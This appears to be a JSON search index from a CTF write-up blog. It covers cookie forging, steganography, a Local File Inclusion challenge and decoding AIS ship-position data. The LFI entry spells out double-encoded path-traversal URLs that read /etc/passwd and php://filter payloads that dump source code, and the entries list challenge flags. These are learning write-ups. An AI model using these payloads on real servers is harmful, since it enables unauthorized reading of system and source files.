\u0026#39;_user_id\u0026#39;: \u0026#39;1\u0026#39;}\u0026#34; --secret \u0026#39;qHIMoRzDyjmWXmtOVYXRUomyOiBaNd\u0026#39; Now I just have to authenticate with the admin cookie and get the flag.\nFlag: PCTF{y0u_can_s1gn_my_c00k13s_anyt1m3_;)}\n","permalink":"https://sanlokii.eu/writeups/patriotctf/not-so-secret/","summary":"Statement: I am creating the next big social networking platform, but I have a history of setting up unsecured software.\nIf you can log in to the admin user, I will give you the flag.\nSomeone hacked my site after I read his message, so I don\u0026rsquo;t read the DMs sent to me anymore! \u0026gt; :(\nOn top of that, I\u0026rsquo;m imposing an even stricter special character filter because I don\u0026rsquo;t really know how to patch my code.","title":"Patriot CTF : Not So Secret"},{"content":"The challenge starts with this image:\nBy modifying the saturation and the chroma hue of the image, we can see a string in base64:\nI then decode the base64 string:\necho -n \u0026#34;YW50aW1pc3NpbGVkZWZlbnNl\u0026#34; | base64 --decode With this command, I get in output the value antimissiledefense\nThis value does not correspond to the flag, so I suppose that it will be used to retrieve the real information.\nI decide to use the steghide tool which allows to hide or extract data in image or audio files.\nSo I run the following command using the passphrase during the interactive mode: antimissiledefense\nsteghide extract -sf classified.jpeg The tool extracts the data and generates the file flag.txt.\nAll I have to do is display the contents of the file to retrieve the flag:\ncat flag.txt Flag : MCTF{cL@$Sif1eD_D0cUm3N7}\n","permalink":"https://sanlokii.eu/writeups/midnightflag/nothing-is-classified/","summary":"The challenge starts with this image:\nBy modifying the saturation and the chroma hue of the image, we can see a string in base64:\nI then decode the base64 string:\necho -n \u0026#34;YW50aW1pc3NpbGVkZWZlbnNl\u0026#34; | base64 --decode With this command, I get in output the value antimissiledefense\nThis value does not correspond to the flag, so I suppose that it will be used to retrieve the real information.\nI decide to use the steghide tool which allows to hide or extract data in image or audio files.","title":"CTF Midnight Flag : Nothing is classified"},{"content":"The challenge statement gives us the following site: https://cloud.midnightflag.fr/index.php\nBy manipulating the URL, I quickly realize that a LFI vulnerability is exploitable.\nSo I start to inject a payload with double encoding in order to get the content of the file /etc/passwd:\nhttps://cloud.midnightflag.fr/index.php?categorie=..%252f..%252f..%252fetc%252fpasswd I have the content of the file in return but I don\u0026rsquo;t see any exploitable user or service:\nSo I decide to download the content of the index.php file with the PHP wrappers:\nhttps://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=index.php With this request, I get the content of the index.php file in base64 directly on the web page.\nAfter decoding, I see the following PHP code corresponding to the LFI filters applied (bypassing the function via double encoding):\n\u0026lt;?php function lfi_filter($value) { $omit_words = array(\u0026#39;..\u0026#39;, \u0026#39;../\u0026#39;, \u0026#39;/\u0026#39;); rsort($omit_words); $new_string = str_replace($omit_words, \u0026#39;\u0026#39;, $value); return $new_string; } if (isset($_GET[\u0026#34;category\u0026#34;])) { $categorie = lfi_filter($_GET[\u0026#34;category\u0026#34;]); include urldecode($categorie); }else { include \u0026#39;home.php\u0026#39;; } ?\u0026gt; From this moment, I look for a little moment before continuing the challenge because the recovered PHP code gives us no additional information.\nSince fuzzing is not allowed on this challenge, it\u0026rsquo;s time for #guessing!\nLooking at the title of the challenge and in adequacy with the structure of the site, after several attempts I try to join the page private.php via https://cloud.midnightflag.fr/index.php?categorie=private.php and I have a return!\nSo I get the source code of this page with the same payload as before:\nhttps://cloud.midnightflag.fr/index.php?categorie=php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=private.php I get the following source code with an interesting ASCII comment:\n\u0026lt;section\u0026gt; \u0026lt;td\u0026gt;\u0026lt;img width=\u0026#34;50%\u0026#34; class=\u0026#34;center\u0026#34; src=\u0026#34;categorie\\Why-So-Sad-Funny-Clown-Face-Picture.jpg\u0026#34; alt=\u0026#34;personal_attack.jpg\u0026#34;\u0026gt;\u0026lt;/td\u0026gt; \u0026lt;!--don\u0026#39;t leak (\\x70\\x65\\x72\\x73\\x6F\\x6E\\x61\\x6C) --\u0026gt; \u0026lt;/section\u0026gt; After conversion, I get the following value: personal\nI suppose that the site has a personal category, so I go to the URL https://cloud.midnightflag.fr/index.php?categorie=personal.php which contains an audio recording in wav format.\nAfter downloading the audio recording, I open it with the Audacity software in order to analyze the content.\nThe audio generated by the recording leads me to believe that an information is present in the spectrogram !\nAfter inversion of the audio track and analysis of the spectrum, I recover the following information:\nFlag: MCTF{H1d3_Y0uR_S3cRe7s}\n","permalink":"https://sanlokii.eu/writeups/midnightflag/to-be-private-or-not-to-be-private/","summary":"The challenge statement gives us the following site: https://cloud.midnightflag.fr/index.php\nBy manipulating the URL, I quickly realize that a LFI vulnerability is exploitable.\nSo I start to inject a payload with double encoding in order to get the content of the file /etc/passwd:\nhttps://cloud.midnightflag.fr/index.php?categorie=..%252f..%252f..%252fetc%252fpasswd I have the content of the file in return but I don\u0026rsquo;t see any exploitable user or service:\nSo I decide to download the content of the index.","title":"CTF Midnight Flag : To be private or not to be private"},{"content":"We start the challenge with an output.txt file:\n!AIVDO,1,1,,A,144UN=000053CHTAqjKHT@000000,0*27 !AIVDO,1,1,,A,144UN=000054s6:At\u0026lt;s8T@000000,0*1B !AIVDO,1,1,,A,144UN=000054;drB7Mq`T@000000,0*22 !AIVDO,1,1,,A,144UN=000054nqRBAQ`HT@000000,0*11 !AIVDO,1,1,,A,144UN=000053A?pBBE88T@000000,0*6A !AIVDO,1,1,,A,144UN=000054otdBj7D8T@000000,0*3A !AIVDO,1,1,,A,144UN=000054otdBJH78T@000000,0*16 !AIVDO,1,1,,A,144UN=000053@;PBIvGHT@000000,0*78 !AIVDO,1,1,,A,144UN=000053?78BkDT8T@000000,0*10 !AIVDO,1,1,,A,144UN=0000539i4C;MQ8T@000000,0*19 !AIVDO,1,1,,A,144UN=000054t9BC\u0026lt;A0pT@000000,0*57 !AIVDO,1,1,,A,144UN=000054s6:Bruk8T@000000,0*4F !AIVDO,1,1,,A,144UN=000054v?NCQwN8T@000000,0*32 !AIVDO,1,1,,A,144UN=000054nqRD7J9HT@000000,0*23 !AIVDO,1,1,,A,144UN=000054pwnCbL=8T@000000,0*27 !AIVDO,1,1,,A,144UN=0000547N6Cc?dpT@000000,0*62 !AIVDO,1,1,,A,144UN=0000547N6CttbpT@000000,0*38 !AIVDO,1,1,,A,144UN=0000546JFCbL=8T@000000,0*74 !AIVDO,1,1,,A,144UN=0000532AbCbL=8T@000000,0*58 !AIVDO,1,1,,A,144UN=000054pwnDS:mpT@000000,0*7F !AIVDO,1,1,,A,144UN=000054otdDGP7HT@000000,0*75 !AIVDO,1,1,,A,144UN=000053ut2DPhF8T@000000,0*10 !AIVDO,1,1,,A,144UN=000053slDDGP7HT@000000,0*56 !AIVDO,1,1,,A,144UN=000053h94DQSn8T@000000,0*54 !AIVDO,1,1,,A,144UN=000052qe0DEq7`T@000000,0*23 !AIVDO,1,1,,A,144UN=000052p`HDUUE`T@000000,0*19 !AIVDO,1,1,,A,144UN=000052oSfDfmTHT@000000,0*29 !AIVDO,1,1,,A,144UN=000054lk8DwEBHT@000000,0*65 !AIVDO,1,1,,A,144UN=000052nO4E@`P8T@000000,0*38 !AIVDO,1,1,,A,144UN=000053du0E8wA8T@000000,0*73 !AIVDO,1,1,,A,144UN=000053g54DnNkHT@000000,0*00 !AIVDO,1,1,,A,144UN=000054kgtES8upT@000000,0*75 !AIVDO,1,1,,A,144UN=000052kA0ES8upT@000000,0*11 !AIVDO,1,1,,A,144UN=000054fOdF=H``T@000000,0*58 !AIVDO,1,1,,A,144UN=000054gRvEg=LHT@000000,0*7E !AIVDO,1,1,,A,144UN=000053rhLEhlL8T@000000,0*42 !AIVDO,1,1,,A,144UN=000053nPnF\u0026gt;UpHT@000000,0*64 !AIVDO,1,1,,A,144UN=000052dlTF=H``T@000000,0*4F !AIVDO,1,1,,A,144UN=000052fv6Ek\u0026gt;spT@000000,0*15 !AIVDO,1,1,,A,144UN=000052bbvFI3G8T@000000,0*15 !AIVDO,1,1,,A,144UN=000052`QFFv4BHT@000000,0*59 !AIVDO,1,1,,A,144UN=000054ejhGf;KpT@000000,0*60 !AIVDO,1,1,,A,144UN=000054iwlG\u0026lt;HP8T@000000,0*0F !AIVDO,1,1,,A,144UN=000053osDG;U08T@000000,0*58 !AIVDO,1,1,,A,144UN=000053noJGeGspT@000000,0*0C !AIVDO,1,1,,A,144UN=000052gDtGd:d8T@000000,0*32 !AIVDO,1,1,,A,144UN=000052gDtG:iP8T@000000,0*0B !AIVDO,1,1,,A,144UN=000054b`nHL2mpT@000000,0*61 !AIVDO,1,1,,A,144UN=000054ejhGtbIpT@000000,0*29 !AIVDO,1,1,,A,144UN=000053gK`Gs3J8T@000000,0*18 !AIVDO,1,1,,A,144UN=000053fG`HAUGHT@000000,0*33 !AIVDO,1,1,,A,144UN=000053d?TGsnr8T@000000,0*3E !AIVDO,1,1,,A,144UN=000052c1lGsnr8T@000000,0*0E !AIVDO,1,1,,A,144UN=000052au2HHlnHT@000000,0*4C !AIVDO,1,1,,A,144UN=000054aURI5ph`T@000000,0*44 !AIVDO,1,1,,A,144UN=000054aURHWeT`T@000000,0*0E !AIVDO,1,1,,A,144UN=000052`p\u0026lt;HV6T`T@000000,0*10 !AIVDO,1,1,,A,144UN=000052VfRI34Q8T@000000,0*65 !AIVDO,1,1,,A,144UN=000052RK2IDGfpT@000000,0*57 !AIVDO,1,1,,A,144UN=000054dgNIDiNpT@000000,0*31 !AIVDO,1,1,,A,144UN=000054`R\u0026lt;IlSbpT@000000,0*4C !AIVDO,1,1,,A,144UN=000053gK`IigK8T@000000,0*59 !AIVDO,1,1,,A,144UN=000053eCVIFj\u0026gt;`T@000000,0*6A !AIVDO,1,1,,A,144UN=000052SOrIgfcHT@000000,0*2D !AIVDO,1,1,,A,144UN=000054TDdJKw5pT@000000,0*61 !AIVDO,1,1,,A,144UN=000054aURIwJqHT@000000,0*0D !AIVDO,1,1,,A,144UN=000053TjtIwlaHT@000000,0*10 !AIVDO,1,1,,A,144UN=000053TjtJLHmpT@000000,0*38 !AIVDO,1,1,,A,144UN=000053RbbJ11q8T@000000,0*70 !AIVDO,1,1,,A,144UN=000052HfLIwJqHT@000000,0*0F !AIVDO,1,1,,A,144UN=000052DJBJNkEHT@000000,0*0E !AIVDO,1,1,,A,144UN=000052?v:Jlk\u0026gt;`T@000000,0*40 !AIVDO,1,1,,A,144UN=000054T=8Jo=fHT@000000,0*41 !AIVDO,1,1,,A,144UN=000054WG@JPB1HT@000000,0*57 !AIVDO,1,1,,A,144UN=000054S9fK\u0026gt;S;HT@000000,0*7F !AIVDO,1,1,,A,144UN=000052\u0026lt;fhK8rd8T@000000,0*4F !AIVDO,1,1,,A,144UN=0000529O@Kcro`T@000000,0*43 !AIVDO,1,1,,A,144UN=0000529O@KkT6pT@000000,0*24 !AIVDO,1,1,,A,144UN=000054Lm2KpI68T@000000,0*49 !AIVDO,1,1,,A,144UN=000053FlPL6p4HT@000000,0*2D !AIVDO,1,1,,A,144UN=000054KiTLBRjpT@000000,0*16 !AIVDO,1,1,,A,144UN=0000521r`LAgBpT@000000,0*5B !AIVDO,1,1,,A,144UN=000054ELHLhew8T@000000,0*69 !AIVDO,1,1,,A,144UN=000054HW0LKk1`T@000000,0*34 !AIVDO,1,1,,A,144UN=0000537o\u0026lt;LKIA`T@000000,0*2A !AIVDO,1,1,,A,144UN=0000532PdLmRvHT@000000,0*6A !AIVDO,1,1,,A,144UN=0000536jfLKk1`T@000000,0*26 !AIVDO,1,1,,A,144UN=000051rEJLJ\u0026lt;1pT@000000,0*25 !AIVDO,1,1,,A,144UN=000051q@2LnFNHT@000000,0*42 !AIVDO,1,1,,A,144UN=000054\u0026lt;wLMEE:HT@000000,0*1E !AIVDO,1,1,,A,144UN=000054DHjLvIMHT@000000,0*36 !AIVDO,1,1,,A,144UN=0000533U\u0026gt;Lw\u0026lt;u8T@000000,0*33 !AIVDO,1,1,,A,144UN=000052qt6MNw98T@000000,0*66 !AIVDO,1,1,,A,144UN=000051eD:MJua`T@000000,0*4B !AIVDO,1,1,,A,144UN=000051lrLLtHe`T@000000,0*04 !AIVDO,1,1,,A,144UN=0000546r:N1HdpT@000000,0*7B !AIVDO,1,1,,A,144UN=000054;90M`L@8T@000000,0*0D !AIVDO,1,1,,A,144UN=000052lmvMW?08T@000000,0*7A !AIVDO,1,1,,A,144UN=000052kiBN7ld8T@000000,0*29 !AIVDO,1,1,,A,144UN=000051MANN5ktHT@000000,0*4D !AIVDO,1,1,,A,144UN=000051UvbMV1hHT@000000,0*68 !AIVDO,1,1,,A,144UN=0000548`FN??Q8T@000000,0*1F !AIVDO,1,1,,A,144UN=0000548`FNRSN`T@000000,0*59 !AIVDO,1,1,,A,144UN=000052w:`NHOgpT@000000,0*53 !AIVDO,1,1,,A,144UN=000052obFN`UepT@000000,0*05 !AIVDO,1,1,,A,144UN=000052S?dNJPO`T@000000,0*53 !AIVDO,1,1,,A,144UN=000051Jd2Nc0=`T@000000,0*7F !AIVDO,1,1,,A,144UN=000051KihNFO08T@000000,0*26 With some research, I gather the following information:\nКрузенштерн is a four-masted barque ship belonging to the Soviet fleet. The AIVDO data is issued by an automatic identification system (AIS) for ships to report their position. With this information, I guess we will have to retrieve the GPS coordinates from the file.\nI go to the site https://www.maritec.co.za/aisvdmvdodecoding to decode the AIVDO data.\nExtract from the output below:\n1,0,273243700,0,+0.0,0.0,0,70.6265900,E,31.2876483,N,219.3,0,0,0,0,0 1,0,273243700,0,+0.0,0.0,0,70.9805950,E,31.3535667,N,219.3,0,0,0,0,0 1,0,273243700,0,+0.0,0.0,0,70.8188217,E,31.6611833,N,219.3,0,0,0,0,0 ... I format my output to get only the GPS coordinates in the format: longitude,latitude\n70.6265900,31.2876483 70.9805950,31.3535667 70.8188217,31.6611833 ... And finally, I go to the following site https://www.gpsvisualizer.com/map_input allowing to inject all my GPS coordinates in order to retrace the route:\nFlag: MCTF{AIS_SECRET_MESS}\n","permalink":"https://sanlokii.eu/writeups/midnightflag/%D0%BA%D1%80%D1%83%D0%B7%D0%B5%D0%BD%D1%88%D1%82%D0%B5%D1%80%D0%BD/","summary":"We start the challenge with an output.txt file:\n!AIVDO,1,1,,A,144UN=000053CHTAqjKHT@000000,0*27 !AIVDO,1,1,,A,144UN=000054s6:At\u0026lt;s8T@000000,0*1B !AIVDO,1,1,,A,144UN=000054;drB7Mq`T@000000,0*22 !AIVDO,1,1,,A,144UN=000054nqRBAQ`HT@000000,0*11 !AIVDO,1,1,,A,144UN=000053A?pBBE88T@000000,0*6A !AIVDO,1,1,,A,144UN=000054otdBj7D8T@000000,0*3A !AIVDO,1,1,,A,144UN=000054otdBJH78T@000000,0*16 !AIVDO,1,1,,A,144UN=000053@;PBIvGHT@000000,0*78 !AIVDO,1,1,,A,144UN=000053?78BkDT8T@000000,0*10 !AIVDO,1,1,,A,144UN=0000539i4C;MQ8T@000000,0*19 !AIVDO,1,1,,A,144UN=000054t9BC\u0026lt;A0pT@000000,0*57 !AIVDO,1,1,,A,144UN=000054s6:Bruk8T@000000,0*4F !AIVDO,1,1,,A,144UN=000054v?NCQwN8T@000000,0*32 !AIVDO,1,1,,A,144UN=000054nqRD7J9HT@000000,0*23 !AIVDO,1,1,,A,144UN=000054pwnCbL=8T@000000,0*27 !AIVDO,1,1,,A,144UN=0000547N6Cc?dpT@000000,0*62 !AIVDO,1,1,,A,144UN=0000547N6CttbpT@000000,0*38 !AIVDO,1,1,,A,144UN=0000546JFCbL=8T@000000,0*74 !AIVDO,1,1,,A,144UN=0000532AbCbL=8T@000000,0*58 !AIVDO,1,1,,A,144UN=000054pwnDS:mpT@000000,0*7F !AIVDO,1,1,,A,144UN=000054otdDGP7HT@000000,0*75 !AIVDO,1,1,,A,144UN=000053ut2DPhF8T@000000,0*10 !AIVDO,1,1,,A,144UN=000053slDDGP7HT@000000,0*56 !AIVDO,1,1,,A,144UN=000053h94DQSn8T@000000,0*54 !AIVDO,1,1,,A,144UN=000052qe0DEq7`T@000000,0*23 !AIVDO,1,1,,A,144UN=000052p`HDUUE`T@000000,0*19 !AIVDO,1,1,,A,144UN=000052oSfDfmTHT@000000,0*29 !AIVDO,1,1,,A,144UN=000054lk8DwEBHT@000000,0*65 !AIVDO,1,1,,A,144UN=000052nO4E@`P8T@000000,0*38 !AIVDO,1,1,,A,144UN=000053du0E8wA8T@000000,0*73 !AIVDO,1,1,,A,144UN=000053g54DnNkHT@000000,0*00 !AIVDO,1,1,,A,144UN=000054kgtES8upT@000000,0*75 !AIVDO,1,1,,A,144UN=000052kA0ES8upT@000000,0*11 !AIVDO,1,1,,A,144UN=000054fOdF=H``T@000000,0*58 !AIVDO,1,1,,A,144UN=000054gRvEg=LHT@000000,0*7E !AIVDO,1,1,,A,144UN=000053rhLEhlL8T@000000,0*42 !AIVDO,1,1,,A,144UN=000053nPnF\u0026gt;UpHT@000000,0*64 !AIVDO,1,1,,A,144UN=000052dlTF=H``T@000000,0*4F !AIVDO,1,1,,A,144UN=000052fv6Ek\u0026gt;spT@000000,0*15 !AIVDO,1,1,,A,144UN=000052bbvFI3G8T@000000,0*15 !AIVDO,1,1,,A,144UN=000052`QFFv4BHT@000000,0*59 !AIVDO,1,1,,A,144UN=000054ejhGf;KpT@000000,0*60 !AIVDO,1,1,,A,144UN=000054iwlG\u0026lt;HP8T@000000,0*0F !AIVDO,1,1,,A,144UN=000053osDG;U08T@000000,0*58 !AIVDO,1,1,,A,144UN=000053noJGeGspT@000000,0*0C !AIVDO,1,1,,A,144UN=000052gDtGd:d8T@000000,0*32 !AIVDO,1,1,,A,144UN=000052gDtG:iP8T@000000,0*0B !AIVDO,1,1,,A,144UN=000054b`nHL2mpT@000000,0*61 !AIVDO,1,1,,A,144UN=000054ejhGtbIpT@000000,0*29 !AIVDO,1,1,,A,144UN=000053gK`Gs3J8T@000000,0*18 !AIVDO,1,1,,A,144UN=000053fG`HAUGHT@000000,0*33 !AIVDO,1,1,,A,144UN=000053d?TGsnr8T@000000,0*3E !AIVDO,1,1,,A,144UN=000052c1lGsnr8T@000000,0*0E !AIVDO,1,1,,A,144UN=000052au2HHlnHT@000000,0*4C !AIVDO,1,1,,A,144UN=000054aURI5ph`T@000000,0*44 !AIVDO,1,1,,A,144UN=000054aURHWeT`T@000000,0*0E !AIVDO,1,1,,A,144UN=000052`p\u0026lt;HV6T`T@000000,0*10 !AIVDO,1,1,,A,144UN=000052VfRI34Q8T@000000,0*65 !AIVDO,1,1,,A,144UN=000052RK2IDGfpT@000000,0*57 !AIVDO,1,1,,A,144UN=000054dgNIDiNpT@000000,0*31 !AIVDO,1,1,,A,144UN=000054`R\u0026lt;IlSbpT@000000,0*4C !AIVDO,1,1,,A,144UN=000053gK`IigK8T@000000,0*59 !","title":"CTF Midnight Flag : Крузенштерн"},{"content":"","permalink":"https://sanlokii.eu/writeups/","summary":"writeups","title":"Writeups"}]